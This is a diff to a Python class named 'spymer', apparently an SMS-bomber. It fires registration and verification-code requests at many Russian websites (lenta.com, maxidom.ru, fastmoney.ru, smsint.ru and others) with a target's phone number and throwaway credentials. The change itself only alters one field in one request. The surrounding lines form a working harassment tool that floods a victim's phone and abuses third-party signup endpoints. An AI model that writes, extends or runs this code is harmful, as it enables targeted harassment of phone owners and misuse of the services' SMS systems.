@@ -76,7 +76,7 @@ class spymer:
 			dozarplati = requests.post('https://online-api.dozarplati.com/rpc', json={"id":'1',"jsonrpc":"2.0","method":"auth.login","params":{"phoneNumber":"79153509908"}})
 			fastmoney = requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]': '+' + _phone, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Р РµРіРёСЃС‚СЂР°С†РёСЏ'})
 			findclone = requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
-			pmsm = requests.post('https://ube.pmsm.org.ru/esb/os-reg/submission', json={'data': {'firstName': _text, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}})
+			pmsm = requests.post('https://ube.pmsm.org.ru/esb/os-reg/submission', json={'data': {'firstName': _name, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}})
 			smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
 			lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
 			maxidom = requests.get('https://www.maxidom.ru/ajax/doRegister.php?send_code_again=Y&email='+_name+'@gmail.com&phone='+_phoneMaxidom+'&code_type=phone', params={'send_code_again': 'Y', 'phone': _phoneMaxidom, 'email': _name+'@gmail.com', 'code_type': 'phone'})
